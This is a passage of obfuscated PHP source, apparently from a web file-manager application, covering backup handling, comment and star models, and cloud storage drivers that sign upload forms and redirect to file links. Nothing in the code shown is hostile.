$ºÎ¯¸×; if (count($¿­Ü½ƒè[$¾œ¢ÊÂ]) > 1) { $ºÎ¯¸×[$¹Ïí›»Å[687]] = !0; } Hook::trigger($¹Ïí›»Å[690], $ºÎ¯¸×); } unset($ºÎ¯¸×); $‰·µŠâ‘ = array($¹Ïí›»Å[561] => array($¹Ïí›»Å[7], array_keys($¿­Ü½ƒè))); $·†¶³Øœ = Model($¹Ïí›»Å[691]); $Œä‹ŞÀ› = $·†¶³Øœ->where($‰·µŠâ‘)->select(); $Œä‹ŞÀ› = $Œä‹ŞÀ› ? $Œä‹ŞÀ› : array(); foreach ($Œä‹ŞÀ› as $èï¨È”’) { if (!isset($¿­Ü½ƒè[$èï¨È”’[$¹Ïí›»Å[561]]])) { continue; } $ºØÆå¸ç = $¿­Ü½ƒè[$èï¨È”’[$¹Ïí›»Å[561]]]; foreach ($ºØÆå¸ç as &$ºÎ¯¸×) { $ºÎ¯¸×[$¹Ïí›»Å[555]] = $èï¨È”’[$¹Ïí›»Å[555]]; $ºÎ¯¸×[$¹Ïí›»Å[687]] = !0; } unset($ºÎ¯¸×); } $Ó÷ñÀÑ’ = array(); foreach ($¤ò„İÄ as $„ÄÊş‚) { Hook::trigger($¹Ïí›»Å[692], $„ÄÊş‚); if (isset($„ÄÊş‚[$¹Ïí›»Å[687]]) && $„ÄÊş‚[$¹Ïí›»Å[687]]) { Hook::trigger($¹Ïí›»Å[693], $„ÄÊş‚); continue; } $¤Ó®Íş™ = $ğĞŞÄ¹‰->getPathInner($„ÄÊş‚[$¹Ïí›»Å[87]]); $í²¿¿œÌ = $·†¶³Øœ->addFileMake($¤Ó®Íş™, $„ÄÊş‚[$¹Ïí›»Å[79]], $„ÄÊş‚[$¹Ïí›»Å[689]], $„ÄÊş‚[$¹Ïí›»Å[561]], $„ÄÊş‚[$¹Ïí›»Å[32]], $¿ù‹—òà); Hook::trigger($¹Ïí›»Å[693], $„ÄÊş‚); if (!is_array($í²¿¿œÌ)) { continue; } $Ó÷ñÀÑ’[] = $í²¿¿œÌ; } $·†¶³Øœ->addAll($Ó÷ñÀÑ’); $‰·µŠâ‘ = array($¹Ïí›»Å[561] => array($¹Ïí›»Å[7], array_keys($¿­Ü½ƒè))); $Œä‹ŞÀ› = $·†¶³Øœ->where($‰·µŠâ‘)->select(); $Œä‹ŞÀ› = $Œä‹ŞÀ› ? $Œä‹ŞÀ› : array(); foreach ($Œä‹ŞÀ› as $èï¨È”’) { if (!isset($¿­Ü½ƒè[$èï¨È”’[$¹Ïí›»Å[561]]])) { continue; } $Ö»´ï”” =& $¿­Ü½ƒè[$èï¨È”’[$¹Ïí›»Å[561]]]; foreach ($Ö»´ï”” as &$ºÎ¯¸×) { $ºÎ¯¸×[$¹Ïí›»Å[555]] = $èï¨È”’[$¹Ïí›»Å[555]]; } unset($ºÎ¯¸×); } $ª¢¼³ôŒ = array(); foreach ($¤ò„İÄ as $î­Şñ—) { $ª¢¼³ôŒ[$î­Şñ—[$¹Ïí›»Å[32]]] = $î­Şñ—; } return $ª¢¼³ôŒ; } } define($_SERVER[‹‰”››ê][694], $_SERVER[‹‰”››ê][695]); $hneuzlbykx = $_SERVER[‹‰”››ê][696]; goto Fõ†·ÁŞù; B´ÊæŠ´¾ó: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x62\x61\x63\x6b\165\160\x4c\151\x73\164"; public $field = array("\151\157", "\156\141\x6d\x65", "\163\164\x61\164\165\163", "\x63\x6f\x6e\x74\x65\x6e\164", "\x6d\141\156\x75\x61\x6c", "\162\145\163\x75\x6c\x74", "\x74\x69\x6d\145\x46\x72\157\155", "\x74\x69\155\145\x54\x6f"); public function config() { $Ó‰Òê—ˆ =& $_SERVER[‹‰”››ê]; Action($Ó‰Òê—ˆ[2017])->taskInit(); $™Ïá°¾­ = Model($Ó‰Òê—ˆ[860])->get($Ó‰Òê—ˆ[867]); $™Ïá°¾­ = json_decode($™Ïá°¾­, !0); $™Ïá°¾­ = is_array($™Ïá°¾­) ? $™Ïá°¾­ : array(); $this->parseContent($™Ïá°¾­); unset($™Ïá°¾­[$Ó‰Òê—ˆ[1760]]); Model($Ó‰Òê—ˆ[1759])->cacheClear(); $ÛÎûÙò¯ = $Ó‰Òê—ˆ[2018]; $Ø•¶ˆúƒ = Model($Ó‰Òê—ˆ[2019])->findByKey($Ó‰Òê—ˆ[1778], $ÛÎûÙò¯); if (!$Ø•¶ˆúƒ) { $Ø•¶ˆúƒ = array(); } if (isset($Ø•¶ˆúƒ[$Ó‰Òê—ˆ[207]])) { $Ø•¶ˆúƒ[$Ó‰Òê—ˆ[207]] = json_decode($Ø•¶ˆúƒ[$Ó‰Òê—ˆ[207]], !0); } if (isset($™Ïá°¾­[$Ó‰Òê—ˆ[207]])) { $Ø•¶ˆúƒ[$Ó‰Òê—ˆ[207]][$Ó‰Òê—ˆ[1763]] = $™Ïá°¾­[$Ó‰Òê—ˆ[207]]; unset($™Ïá°¾­[$Ó‰Òê—ˆ[207]]); } return array_merge($Ø•¶ˆúƒ, $™Ïá°¾­); } public function listData($æ¯†ßğù = false, $œÖ³¯ı³ = "\x6d\x6f\x64\x69\146\171\124\x69\x6d\x65", $Ó²æÌ… = false) { $ÉÁœ£¯ˆ = parent::listData($æ¯†ßğù, $œÖ³¯ı³, !0); if (!$ÉÁœ£¯ˆ) { return $ÉÁœ£¯ˆ; } if ($æ¯†ßğù) { $ÉÁœ£¯ˆ = array($ÉÁœ£¯ˆ); } foreach ($ÉÁœ£¯ˆ as &$›¥İ…Ó†) { $this->parseContent($›¥İ…Ó†); } return $æ¯†ßğù ? $ÉÁœ£¯ˆ[0] : $ÉÁœ£¯ˆ; } public function parseContent(&$Ù‰„Öš„) { $ÁİÂ‰ãØ =& $_SERVER[‹‰”››ê]; $Ã¦´ãøá = _get($Ù‰„Öš„, $ÁİÂ‰ãØ[171], $ÁİÂ‰ãØ[91]); if (!in_array($Ã¦´ãøá, array($ÁİÂ‰ãØ[866], $ÁİÂ‰ãØ[1225]))) { $Ù‰„Öš„[$ÁİÂ‰ãØ[171]] = $Ã¦´ãøá == $ÁİÂ‰ãØ[91] ? $ÁİÂ‰ãØ[1225] : $ÁİÂ‰ãØ[866]; } } public function lastItem() { $ê‹«ÎÏŞ = $this->listData(); return !empty($ê‹«ÎÏŞ[0]) ? $ê‹«ÎÏŞ[0] : null; } public function kill($şí˜Õâ‘) { $³Áå¼ê =& $_SERVER[‹‰”››ê]; $ê’´á¿» = $this->listData($şí˜Õâ‘); if (!$ê’´á¿» || empty($ê’´á¿»[$³Áå¼ê[32]])) { return !0; } Task::kill($³Áå¼ê[875]); Task::kill($³Áå¼ê[894]); Task::kill($³Áå¼ê[904]); $˜ùü³Ùä = $ê’´á¿»[$³Áå¼ê[32]]; $Ï¹ä‚ª = TEMP_FILES . $³Áå¼ê[870] . $˜ùü³Ùä . $³Áå¼ê[8]; IO::remove($Ï¹ä‚ª, !1); return $this->remove($şí˜Õâ‘); } public function remove($°†ŒÀ¤Ó) { $í¡ÛíÑ˜ = $this->listData($°†ŒÀ¤Ó); if (!$í¡ÛíÑ˜) { return !0; } return $this->backupRemove($í¡ÛíÑ˜); } private function backupRemove($Ä¼¯—ã´) { parent::remove($Ä¼¯—ã´[$_SERVER[‹‰”››ê][487]]); $ñ´Ø´üƒ = $this->backupPath($Ä¼¯—ã´); IO::remove($ñ´Ø´üƒ, !1); return !0; } private function backupPath($Ìš½Ï˜) { $Şå‹î¾ =& $_SERVER[‹‰”››ê]; $Ê÷ØÂì± = $Ìš½Ï˜[$Şå‹î¾[32]]; $®ËÃòú = Model($Şå‹î¾[860])->get($Şå‹î¾[861]); $¯ûÀ˜‡Á = substr(md5($Şå‹î¾[862] . $®ËÃòú . $Ê÷ØÂì±), 0, 8); return "\x7b\151\157\x3a{$Ìš½Ï˜[$Şå‹î¾[842]]}\x7d\x2f\144\141\x74\141\142\x61\x73\145\x2f\x62\141\143\x6b\165\x70\x2f" . $Ê÷ØÂì± . $Şå‹î¾[11] . $¯ûÀ˜‡Á; } public function start() { $‘¸ÅëÂ” =& $_SERVER[‹‰”››ê]; if ($GLOBALS[$‘¸ÅëÂ”[6]][$‘¸ÅëÂ”[92]][$‘¸ÅëÂ”[2020]] != $‘¸ÅëÂ”[91]) { return !0; } $»’…™ç¥ = $this->config(); if (!$»’…™ç¥ || $»’…™ç¥[$‘¸ÅëÂ”[1760]] != $‘¸ÅëÂ”[91]) { return !1; } if ($»’…™ç¥[$‘¸ÅëÂ”[171]] == $‘¸ÅëÂ”[866]) { $ñóï¯† = Model($‘¸ÅëÂ”[860])->get($‘¸ÅëÂ”[1340]); if ($ñóï¯† == $‘¸ÅëÂ”[1341]) { $»’…™ç¥[$‘¸ÅëÂ”[171]] = $‘¸ÅëÂ”[1225]; } } $–À½ğİÀ = $this->process(); foreach ($–À½ğİÀ as $ßåäâ§á) { if ($ßåäâ§á) { return Task::restart($ßåäâ§á[$‘¸ÅëÂ”[487]]); } } $ôÚÙ¥Çã = new Backup(); $’é¸º‡ = $ôÚÙ¥Çã->db(); if ($’é¸º‡) { $’é¸º‡ = $ôÚÙ¥Çã->dbFile(); if ($’é¸º‡ && $»’…™ç¥[$‘¸ÅëÂ”[171]] == $‘¸ÅëÂ”[866]) { $’é¸º‡ = $ôÚÙ¥Çã->file(); } } Backup::set(array($‘¸ÅëÂ”[840] => 1, $‘¸ÅëÂ”[851] => time())); return !0; } public function process() { $ò¨¬ıæ =& $_SERVER[‹‰”››ê]; $‚öÛ°»œ = array($ò¨¬ıæ[847] => Task::get($ò¨¬ıæ[875]), $ò¨¬ıæ[852] => Task::get($ò¨¬ıæ[894]), $ò¨¬ıæ[233] => Task::get($ò¨¬ıæ[904])); $ˆ–ËÛÒ = !1; foreach ($‚öÛ°»œ as &$Í‚ÆƒšÀ) { if ($ˆ–ËÛÒ) { $Í‚ÆƒšÀ = !1; continue; } if ($Í‚ÆƒšÀ) { $œùç‰• = intval(_get($Í‚ÆƒšÀ, $ò¨¬ıæ[1796], 0)); if (time() - $œùç‰• > 7200) { Task::kill($Í‚ÆƒšÀ[$ò¨¬ıæ[487]]); $ˆ–ËÛÒ = !0; $Í‚ÆƒšÀ = !1; } } } return $‚öÛ°»œ; } public function restore() { $éÚËáÇî =& $_SERVER[‹‰”››ê]; ActionCall($éÚËáÇî[1153], !0, 1); ActionCall($éÚËáÇî[1153], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\155\145" => "\x63\157\155\x6d\x65\156\x74\x5f\155\x65\164\141", "\155\145\164\141\106\151\x65\x6c\144" => "\x63\x6f\155\155\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ğƒ†Ôé) { $ûÎ“—‰¢ =& $_SERVER[‹‰”››ê]; if ($ğƒ†Ôé[$ûÎ“—‰¢[2021]]) { $†Åå©Ø¼ = $this->where(array($ûÎ“—‰¢[2022] => $ğƒ†Ôé[$ûÎ“—‰¢[2021]]))->find(); if (!$†Åå©Ø¼ || $†Åå©Ø¼[$ûÎ“—‰¢[191]] != $ğƒ†Ôé[$ûÎ“—‰¢[191]] || $†Åå©Ø¼[$ûÎ“—‰¢[583]] != $ğƒ†Ôé[$ûÎ“—‰¢[583]]) { return !1; } $this->where(array($ûÎ“—‰¢[2022] => $ğƒ†Ôé[$ûÎ“—‰¢[2021]]))->setAdd($ûÎ“—‰¢[2023], 1); } $ğƒ†Ôé[$ûÎ“—‰¢[2024]] = 0; $ğƒ†Ôé[$ûÎ“—‰¢[2023]] = 0; $ğƒ†Ôé[$ûÎ“—‰¢[840]] = 1; return $this->add($ğƒ†Ôé); } public function commentCount($ò…éçñ , $–ñã’Ñ, $´äÒ´ = false) { $ç £š™÷ =& $_SERVER[‹‰”››ê]; if (!$ò…éçñ ) { return array(); } if (is_string($ò…éçñ ) || is_int($ò…éçñ )) { $ò…éçñ  = array($ò…éçñ ); } $ëöÖÛşÓ = array($ç £š™÷[583], $ç £š™÷[2025] => $ç £š™÷[579]); $•§ôóäç = array($ç £š™÷[583] => array($ç £š™÷[7], $ò…éçñ ), $ç £š™÷[191] => $–ñã’Ñ); if ($´äÒ´) { $•§ôóäç[$ç £š™÷[1791]] = $´äÒ´; } $è¿çşïÍ = $this->field($ëöÖÛşÓ)->where($•§ôóäç)->group($ç £š™÷[583])->select(); return array_to_keyvalue($è¿çşïÍ, $ç £š™÷[583], $ç £š™÷[579]); } public function starTarget($ÕË¾‚®, $Ó­ù›î) { $¿¿¬¥‹‹ =& $_SERVER[‹‰”››ê]; $ü®Ê•…© = $ÕË¾‚® + self::TYPE_STAR_OFFSET; $ï’è‡…™ = array($¿¿¬¥‹‹[1791] => USER_ID, $¿¿¬¥‹‹[191] => $ü®Ê•…©, $¿¿¬¥‹‹[583] => $Ó­ù›î); $¸¶›û¸ = $this->where($ï’è‡…™)->find(); if ($¸¶›û¸) { return $this->where(array($¿¿¬¥‹‹[487] => $¸¶›û¸[$¿¿¬¥‹‹[487]]))->delete(); } $ÍÏŒ³ş = array($¿¿¬¥‹‹[2021] => 0, $¿¿¬¥‹‹[1791] => USER_ID, $¿¿¬¥‹‹[840] => 1, $¿¿¬¥‹‹[171] => $¿¿¬¥‹‹[12], $¿¿¬¥‹‹[191] => $ü®Ê•…©, $¿¿¬¥‹‹[583] => $Ó­ù›î, $¿¿¬¥‹‹[2024] => 0, $¿¿¬¥‹‹[2023] => 0); return $this->add($ÍÏŒ³ş); } public function starTargetCount($È¬¤ºÂ€, $î«ãÎ) { $™êÖù¸Û =& $_SERVER[‹‰”››ê]; $—¯ü»û§ = $î«ãÎ + self::TYPE_STAR_OFFSET; $¡¢§î¾ = $this->commentCount($È¬¤ºÂ€, $—¯ü»û§); $¯È–ô˜ = $this->commentCount($È¬¤ºÂ€, $—¯ü»û§, USER_ID); return array($™êÖù¸Û[2026] => $¡¢§î¾, $™êÖù¸Û[2027] => $¯È–ô˜); } public function starTargetUserList($²ãÈ®Üğ, $üùîøÏ) { $÷ÒŠÓ¾ =& $_SERVER[‹‰”››ê]; $ÒşÅŞ¡ı = $²ãÈ®Üğ + self::TYPE_STAR_OFFSET; $¹ûÊÆÎƒ = array($÷ÒŠÓ¾[583] => $üùîøÏ, $÷ÒŠÓ¾[191] => $ÒşÅŞ¡ı); $Ğ«Å¹‚ = $this->where($¹ûÊÆÎƒ)->count(); $ŞÍ¬ƒ•½ = array($÷ÒŠÓ¾[344] => $Ğ«Å¹‚, $÷ÒŠÓ¾[2028] => array()); if (!$Ğ«Å¹‚) { return $ŞÍ¬ƒ•½; } $í˜îı¸ü = $this->field($÷ÒŠÓ¾[1791])->where($¹ûÊÆÎƒ)->limit(500)->select(); $í˜îı¸ü = array_to_keyvalue($í˜îı¸ü, $÷ÒŠÓ¾[12], $÷ÒŠÓ¾[1791]); $ŞÍ¬ƒ•½[$÷ÒŠÓ¾[2028]] = Model($÷ÒŠÓ¾[591])->userListInfo($í˜îı¸ü); return $ŞÍ¬ƒ•½; } public function prasiseUserList($¡ƒÄòÓç) { $ÈÍÔ¤ûŸ =& $_SERVER[‹‰”››ê]; $¥¿º¤‰ø = array($ÈÍÔ¤ûŸ[2029] => $¡ƒÄòÓç); $üÒÍı§ = $this->where($¥¿º¤‰ø)->find(); $Ùâ—…õ  = _get($üÒÍı§, $ÈÍÔ¤ûŸ[2024], 0); $ëıÒà = array($ÈÍÔ¤ûŸ[344] => $Ùâ—…õ , $ÈÍÔ¤ûŸ[2028] => array()); if (!$Ùâ—…õ ) { return $ëıÒà; } $ÕŞ°àè = Model($ÈÍÔ¤ûŸ[2030])->field($ÈÍÔ¤ûŸ[1791])->where($¥¿º¤‰ø)->limit(500)->select(); $ÕŞ°àè = array_to_keyvalue($ÕŞ°àè, $ÈÍÔ¤ûŸ[12], $ÈÍÔ¤ûŸ[1791]); $ëıÒà[$ÈÍÔ¤ûŸ[2028]] = Model($ÈÍÔ¤ûŸ[591])->userListInfo($ÕŞ°àè); return $ëıÒà; } public function remove($ñ¹æŠÁ ) { $ÇÛáÍè¬ =& $_SERVER[‹‰”››ê]; $ëû²»úÑ = array($ÇÛáÍè¬[2022] => $ñ¹æŠÁ ); $ÌÊ„ù·ş = $this->where($ëû²»úÑ)->find(); if ($ÌÊ„ù·ş[$ÇÛáÍè¬[2021]]) { $this->where(array($ÇÛáÍè¬[2022] => $ÌÊ„ù·ş[$ÇÛáÍè¬[2021]]))->setAdd($ÇÛáÍè¬[2023], -1); } return $this->where($ëû²»úÑ)->delete(); } public function edit($±‘«Ş¡, $Å˜«õ»à) { $Ş‡Á«ô =& $_SERVER[‹‰”››ê]; $Àë†±û˜ = array($Ş‡Á«ô[2022] => $±‘«Ş¡); return $this->where($Àë†±û˜)->save(array($Ş‡Á«ô[2031] => $Å˜«õ»à)); } public function prasise($ëÓŞó¸ú) { $˜¾Íà¿ =& $_SERVER[‹‰”››ê]; $¬ó÷‰® = Model($˜¾Íà¿[2032]); $¼º‡•â = array($˜¾Íà¿[2022] => $ëÓŞó¸ú, $˜¾Íà¿[1782] => USER_ID); $­¯œÆŒè = $¬ó÷‰®->where($¼º‡•â)->find(); if (!$­¯œÆŒè) { $¬ó÷‰®->add($¼º‡•â); $ÚÖ™Şúë = $this->where(array($˜¾Íà¿[2022] => $ëÓŞó¸ú))->setAdd($˜¾Íà¿[2024], 1); } else { $¬ó÷‰®->where($¼º‡•â)->delete(); $ÚÖ™Şúë = $this->where(array($˜¾Íà¿[2022] => $ëÓŞó¸ú))->setAdd($˜¾Íà¿[2024], -1); } return $ÚÖ™Şúë; } public function targetInfo($÷×ÈºŞ, $®Œ†ı×´) { $ØçşèÀ£ =& $_SERVER[‹‰”››ê]; $êòÙ³‚ = array($ØçşèÀ£[665] => $÷×ÈºŞ, $ØçşèÀ£[666] => $®Œ†ı×´); $é¿¿“çº = $this->where($êòÙ³‚)->count(); $¬ÖÄôê’ = "\122\x49\107\110\124\40\112\117\x49\116\40{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\164\137\160\162\x61\151\x73\145\40\163\164\141\x72\x20\x6f\156\40\x63\157\x6d\x6d\x65\x6e\x74\56\x63\x6f\x6d\155\145\x6e\x74\x49\104\x20\x3d\40\x73\164\141\x72\56\143\157\x6d\155\x65\156\164\111\104"; $³¾Úí‹ = $this->alias($ØçşèÀ£[441])->where($êòÙ³‚)->join($¬ÖÄôê’, $ØçşèÀ£[2033])->count(); $ˆäÛùñ = array($ØçşèÀ£[2034] => $é¿¿“çº, $ØçşèÀ£[2035] => $³¾Úí‹); return $ˆäÛùñ; } public function listData($Íˆüùé) { $÷…çòƒ· =& $_SERVER[‹‰”››ê]; if (isset($Íˆüùé[$÷…çòƒ·[2036]])) { if ($Íˆüùé[$÷…çòƒ·[2036]]) { $Íˆüùé[$÷…çòƒ·[2029]] = array($÷…çòƒ·[1107], intval($Íˆüùé[$÷…çòƒ·[2036]])); } unset($Íˆüùé[$÷…çòƒ·[2036]]); } if (isset($Íˆüùé[$÷…çòƒ·[2037]])) { if ($Íˆüùé[$÷…çòƒ·[2037]]) { $Íˆüùé[$÷…çòƒ·[2029]] = array($÷…çòƒ·[1104], intval($Íˆüùé[$÷…çòƒ·[2037]])); } unset($Íˆüùé[$÷…çòƒ·[2037]]); } return $this->_listData($Íˆüùé); } private function _listData($°æ‡°ã) { $Ùƒæ×üä =& $_SERVER[‹‰”››ê]; $¼Õ¿üöì = $this->where($°æ‡°ã)->_makeOrder()->selectPage(100); $this->_listAppendParent($¼Õ¿üöì[$Ùƒæ×üä[457]]); $this->_listAppendUser($¼Õ¿üöì[$Ùƒæ×üä[457]]); $this->_listAppendMeta($¼Õ¿üöì[$Ùƒæ×üä[457]]); return $¼Õ¿üöì; } private function _makeOrder() { $—Ò¶Óù =& $_SERVER[‹‰”››ê]; $÷°±Ş‡ = array($—Ò¶Óù[2024], $—Ò¶Óù[2023], $—Ò¶Óù[234]); $Á•Àãâ = Input::get($—Ò¶Óù[542], $—Ò¶Óù[7], $—Ò¶Óù[509], $÷°±Ş‡); $„Ã½µóÁ = Input::get($—Ò¶Óù[543], $—Ò¶Óù[7], $—Ò¶Óù[1784], array($—Ò¶Óù[2038], $—Ò¶Óù[538])); $‡®ˆ‡—å = $Á•Àãâ . $—Ò¶Óù[53] . $„Ã½µóÁ; return $this->order($‡®ˆ‡—å); } private function _listAppendParent(&$ØÅŒĞ›¡) { $ß“ÇÊÄŞ =& $_SERVER[‹‰”››ê]; $ˆÎèŒã = array_unique(array_to_keyvalue($ØÅŒĞ›¡, $ß“ÇÊÄŞ[12], $ß“ÇÊÄŞ[2021])); $ˆÎèŒã = array_remove_value($ˆÎèŒã, $ß“ÇÊÄŞ[231]); if (!$ˆÎèŒã) { return; } $±é£¼¸× = $this->where(array($ß“ÇÊÄŞ[2022] => array($ß“ÇÊÄŞ[7], $ˆÎèŒã)))->select(); $±é£¼¸× = array_to_keyvalue($±é£¼¸×, $ß“ÇÊÄŞ[2029]); foreach ($ØÅŒĞ›¡ as &$Ù¢î¦ó¿) { if (isset($±é£¼¸×[$Ù¢î¦ó¿[$ß“ÇÊÄŞ[2021]]])) { $Ù¢î¦ó¿[$ß“ÇÊÄŞ[2039]] = $±é£¼¸×[$Ù¢î¦ó¿[$ß“ÇÊÄŞ[2021]]]; } } unset($Ù¢î¦ó¿); } private function _listAppendUser(&$°ÀÎöİë) { $ÙÅ€«ôœ =& $_SERVER[‹‰”››ê]; $ü¸ı´ƒ = array_unique(array_to_keyvalue($°ÀÎöİë, $ÙÅ€«ôœ[12], $ÙÅ€«ôœ[1791])); $ü¸ı´ƒ = array_remove_value($ü¸ı´ƒ, $ÙÅ€«ôœ[231]); if (count($ü¸ı´ƒ) == 0) { return; } foreach ($°ÀÎöİë as $„Ë½ØÀÃ) { if (isset($„Ë½ØÀÃ[$ÙÅ€«ôœ[2039]])) { $ü¸ı´ƒ[] = $„Ë½ØÀÃ[$ÙÅ€«ôœ[2039]][$ÙÅ€«ôœ[1791]]; } } $ÏŞƒÇáú = Model($ÙÅ€«ôœ[611])->userListInfo($ü¸ı´ƒ); foreach ($°ÀÎöİë as &$„Ë½ØÀÃ) { $„Ë½ØÀÃ[$ÙÅ€«ôœ[679]] = $ÏŞƒÇáú[$„Ë½ØÀÃ[$ÙÅ€«ôœ[1791]]]; if (isset($„Ë½ØÀÃ[$ÙÅ€«ôœ[2039]])) { $„Ë½ØÀÃ[$ÙÅ€«ôœ[2039]][$ÙÅ€«ôœ[679]] = $ÏŞƒÇáú[$„Ë½ØÀÃ[$ÙÅ€«ôœ[2039]][$ÙÅ€«ôœ[1791]]]; } } unset($„Ë½ØÀÃ); } private function _listAppendMeta(&$¾•­æ©ü) { $ï«èşÁ‡ =& $_SERVER[‹‰”››ê]; $‹±ùíÚò = array_unique(array_to_keyvalue($¾•­æ©ü, $ï«èşÁ‡[12], $ï«èşÁ‡[2029])); $‹±ùíÚò = array_remove_value($‹±ùíÚò, $ï«èşÁ‡[231]); if (!$‹±ùíÚò) { return; } foreach ($¾•­æ©ü as $­úÃÅ€ø) { if (isset($­úÃÅ€ø[$ï«èşÁ‡[2039]])) { $‹±ùíÚò[] = $­úÃÅ€ø[$ï«èşÁ‡[2039]][$ï«èşÁ‡[2029]]; } } $çÙ¥¼ = $this->metaList($‹±ùíÚò); if (!$çÙ¥¼) { return !1; } foreach ($¾•­æ©ü as &$­úÃÅ€ø) { $­úÃÅ€ø[$ï«èşÁ‡[553]] = $çÙ¥¼[$­úÃÅ€ø[$ï«èşÁ‡[2029]]]; if (isset($­úÃÅ€ø[$ï«èşÁ‡[2039]])) { $­úÃÅ€ø[$ï«èşÁ‡[2039]][$ï«èşÁ‡[553]] = $çÙ¥¼[$­úÃÅ€ø[$ï«èşÁ‡[2039]][$ï«èşÁ‡[2029]]]; } } unset($­úÃÅ€ø); } private function metaList($ä¯è¾•Ø) { $¡ÆÑô¸× =& $_SERVER[‹‰”››ê]; if (!$ä¯è¾•Ø) { return array(); } $¬›¥¹‚ = array($¡ÆÑô¸×[2029] => array($¡ÆÑô¸×[7], $ä¯è¾•Ø)); $Ã’Á•³ = Model($¡ÆÑô¸×[2040])->where($¬›¥¹‚)->select(); $Ã’Á•³ = array_to_keyvalue_group($Ã’Á•³, $¡ÆÑô¸×[2029]); foreach ($Ã’Á•³ as $®ë€»ù‡ => $ëóËĞÎ¥) { $ÈŞûû³ = array(); foreach ($ëóËĞÎ¥ as $ïÓÒ×Â¨) { $ÈŞûû³[$ïÓÒ×Â¨[$¡ÆÑô¸×[97]]] = $ïÓÒ×Â¨[$¡ÆÑô¸×[462]]; } $Ã’Á•³[$®ë€»ù‡] = $ÈŞûû³; } return $Ã’Á•³ ? $Ã’Á•³ : array(); } public function removeTarget($ÄšÊİĞ¸, $áÎŠ¹³) { $³Ÿø•Œ‹ =& $_SERVER[‹‰”››ê]; if (!$áÎŠ¹³) { return !0; } $áÎŠ¹³ = is_array($áÎŠ¹³) ? $áÎŠ¹³ : array($áÎŠ¹³); $‰¾éüã = array($³Ÿø•Œ‹[191] => $ÄšÊİĞ¸, $³Ÿø•Œ‹[583] => array($³Ÿø•Œ‹[7], $áÎŠ¹³)); $Á±ìíÏ’ = $this->field($³Ÿø•Œ‹[2029])->where($‰¾éüã)->select(); $øº­ÆŸç = array_to_keyvalue($Á±ìíÏ’, $³Ÿø•Œ‹[12], $³Ÿø•Œ‹[2029]); if (!$øº­ÆŸç) { return !0; } $‰¾éüã = array($³Ÿø•Œ‹[2029] => array($³Ÿø•Œ‹[7], $øº­ÆŸç)); $this->where($‰¾éüã)->delete(); Model($³Ÿø•Œ‹[2032])->where($‰¾éüã)->delete(); Model($³Ÿø•Œ‹[2041])->where($‰¾éüã)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\151\154\x65\x5f\143\x6f\156\x74\x65\156\164\163"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\124\151\155\145", "\164\151\x6d\145", "\151\156\x73\x65\x72\164", "\146\x75\x6e\143\164\x69\157\156")); } goto aø¸ ‰‘š‚; b±ƒëø±£›: class PathDriverBOS extends PathDriverS3 { public function __construct($„Ó•â•—) { parent::__construct($„Ó•â•—); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($áºı·ğ) { $ËÕâ¤¬ =& $_SERVER[‹‰”››ê]; if (substr($áºı·ğ, 0, 7) == $ËÕâ¤¬[219]) { $áºı·ğ = $ËÕâ¤¬[220] . substr($áºı·ğ, 7); } header($ËÕâ¤¬[175] . $áºı·ğ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÂÍàá) { parent::__construct($ÂÍàá); $this->setSignVersion($_SERVER[‹‰”››ê][250]); } public function uploadFormData($äİı´è×, $ Æ¥§» = 3600) { $Æ®Î³Ü« =& $_SERVER[‹‰”››ê]; $ËåüŞ¼İ = $Æ®Î³Ü«[232]; $šª²É‚ï = $Æ®Î³Ü«[1428]; $ı¿Ù¯Ø† = $Æ®Î³Ü«[264]; $ùºû™± = gmdate($Æ®Î³Ü«[1429], time() + $ Æ¥§»); $´Ş˜‘±© = (string) time() . $Æ®Î³Ü«[74] . (string) (time() + $ Æ¥§»); $ ƒêú•Ó = array($Æ®Î³Ü«[265] => $ùºû™±, $Æ®Î³Ü«[268] => array(array($Æ®Î³Ü«[309] => $ËåüŞ¼İ), array($Æ®Î³Ü«[269] => $this->bucket), array($Æ®Î³Ü«[270], $Æ®Î³Ü«[271], $Æ®Î³Ü«[12]), array($Æ®Î³Ü«[273] => $ı¿Ù¯Ø†), array($Æ®Î³Ü«[1430] => $šª²É‚ï), array($Æ®Î³Ü«[1431] => $this->accessKey), array($Æ®Î³Ü«[1432] => $´Ş˜‘±©))); $ ƒêú•Ó = json_encode($ ƒêú•Ó); $¾Ç«³»í = hash_hmac($Æ®Î³Ü«[1428], $´Ş˜‘±©, $this->secret); $¨ò‡Æó§ = sha1($ ƒêú•Ó); $ï€ÏÚ = hash_hmac($Æ®Î³Ü«[1428], $¨ò‡Æó§, $¾Ç«³»í); $ÀÛ€¢ÅÏ = array($Æ®Î³Ü«[309] => $ËåüŞ¼İ, $Æ®Î³Ü«[273] => $ı¿Ù¯Ø†, $Æ®Î³Ü«[280] => base64_encode($ ƒêú•Ó), $Æ®Î³Ü«[1430] => $šª²É‚ï, $Æ®Î³Ü«[1431] => $this->accessKey, $Æ®Î³Ü«[1433] => $´Ş˜‘±©, $Æ®Î³Ü«[1434] => $ï€ÏÚ, $Æ®Î³Ü«[209] => $this->getHost()); return $ÀÛ€¢ÅÏ; } public function fileOutImage($ÖÔŠ¥çˆ, $ãğ¿ğÀ = 250) { $±î‰å‰ô =& $_SERVER[‹‰”››ê]; if ($this->size($ÖÔŠ¥çˆ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ÖÔŠ¥çˆ, $ãğ¿ğÀ); } $«»Ûæ­ş = $this->link($ÖÔŠ¥çˆ); $«»Ûæ­ş .= $±î‰å‰ô[1435] . $ãğ¿ğÀ . $±î‰å‰ô[1436]; $this->fileOutLink($«»Ûæ­ş); } public function fileOutLink($åÄõ—êğ) { $ğÀóí‘³ =& $_SERVER[‹‰”››ê]; if (substr($åÄõ—êğ, 0, 7) == 